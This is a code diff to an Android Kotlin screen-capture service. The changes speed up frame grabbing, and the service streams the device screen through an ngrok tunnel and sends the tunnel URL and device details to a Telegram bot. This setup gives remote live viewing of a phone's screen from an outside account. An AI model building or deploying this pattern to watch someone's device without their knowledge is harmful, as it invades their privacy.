@@ -13,14 +13,15 @@ import android.os.*
 import android.util.DisplayMetrics
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
+import java.io.ByteArrayOutputStream
 
 class ScreenCaptureService : Service() {
 
     private lateinit var mediaProjection: MediaProjection
     private lateinit var virtualDisplay: VirtualDisplay
     private lateinit var imageReader: ImageReader
-    private lateinit var captureHandler: Handler
     private lateinit var captureThread: HandlerThread
+    private lateinit var captureHandler: Handler
     private lateinit var tunnelManager: TunnelManager
     private lateinit var telegram: TelegramNotifier
 
@@ -30,7 +31,6 @@ class ScreenCaptureService : Service() {
 
     companion object {
         const val CHANNEL_ID = "cap_service"
-
         @Volatile var latestJpeg: ByteArray? = null
         @Volatile var frameTimestamp: Long   = 0L
         @Volatile var frameCount: Long       = 0L
@@ -44,11 +44,14 @@ class ScreenCaptureService : Service() {
         @Suppress("DEPRECATION")
         (getSystemService(WINDOW_SERVICE) as WindowManager)
             .defaultDisplay.getMetrics(metrics)
-        screenWidth   = metrics.widthPixels
-        screenHeight  = metrics.heightPixels
+
+        // Capture at half resolution for speed
+        screenWidth   = metrics.widthPixels  / 2
+        screenHeight  = metrics.heightPixels / 2
         screenDensity = metrics.densityDpi
 
-        captureThread = HandlerThread("CaptureThread").also { it.start() }
+        captureThread = HandlerThread("CaptureThread", Process.THREAD_PRIORITY_URGENT_DISPLAY)
+            .also { it.start() }
         captureHandler = Handler(captureThread.looper)
 
         telegram = TelegramNotifier(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
@@ -64,66 +67,56 @@ class ScreenCaptureService : Service() {
         val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         mediaProjection = mpm.getMediaProjection(resultCode, data)
 
-        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
+        // 3 buffers for smooth pipeline
+        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 3)
+
+        // Callback-based — no polling delay
+        imageReader.setOnImageAvailableListener({ reader ->
+            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+            try {
+                val planes      = image.planes
+                val buffer      = planes[0].buffer
+                val pixelStride = planes[0].pixelStride
+                val rowStride   = planes[0].rowStride
+                val rowPadding  = rowStride - pixelStride * screenWidth
+
+                val bmp = Bitmap.createBitmap(
+                    screenWidth + rowPadding / pixelStride,
+                    screenHeight,
+                    Bitmap.Config.RGB_565   // faster than ARGB_8888
+                )
+                bmp.copyPixelsFromBuffer(buffer)
+
+                val cropped = Bitmap.createBitmap(bmp, 0, 0, screenWidth, screenHeight)
+                bmp.recycle()
+
+                val baos = ByteArrayOutputStream(32 * 1024)
+                cropped.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                cropped.recycle()
+
+                latestJpeg     = baos.toByteArray()
+                frameTimestamp = System.currentTimeMillis()
+                frameCount++
+            } finally {
+                image.close()
+            }
+        }, captureHandler)
 
         virtualDisplay = mediaProjection.createVirtualDisplay(
             "CapDisplay",
             screenWidth, screenHeight, screenDensity,
             DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-            imageReader.surface, null, null
+            imageReader.surface, null, captureHandler
         )
 
-        scheduleCaptureLoop()
-
-        // Start ngrok tunnel → send URL to Telegram
         tunnelManager.onUrlReady = { url ->
             val device = "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
             telegram.sendUrl(url, device)
-            (applicationContext as? MainActivity)?.updateStatus("🟢 Live: $url")
+            (applicationContext as? MainActivity)?.updateStatus("🟢 $url")
         }
         tunnelManager.start()
 
         return START_STICKY
-    }
-
-    private fun scheduleCaptureLoop() {
-        captureHandler.post(object : Runnable {
-            override fun run() {
-                captureFrame()
-                captureHandler.postDelayed(this, Config.CAPTURE_INTERVAL_MS)
-            }
-        })
-    }
-
-    private fun captureFrame() {
-        val image = imageReader.acquireLatestImage() ?: return
-        try {
-            val planes     = image.planes
-            val buffer     = planes[0].buffer
-            val pixelStride = planes[0].pixelStride
-            val rowStride   = planes[0].rowStride
-            val rowPadding  = rowStride - pixelStride * screenWidth
-
-            val bmp = Bitmap.createBitmap(
-                screenWidth + rowPadding / pixelStride,
-                screenHeight,
-                Bitmap.Config.ARGB_8888
-            )
-            bmp.copyPixelsFromBuffer(buffer)
-
-            val cropped = Bitmap.createBitmap(bmp, 0, 0, screenWidth, screenHeight)
-            bmp.recycle()
-
-            val baos = java.io.ByteArrayOutputStream()
-            cropped.compress(Bitmap.CompressFormat.JPEG, 75, baos)
-            cropped.recycle()
-
-            latestJpeg     = baos.toByteArray()
-            frameTimestamp = System.currentTimeMillis()
-            frameCount++
-        } finally {
-            image.close()
-        }
     }
 
     override fun onDestroy() {
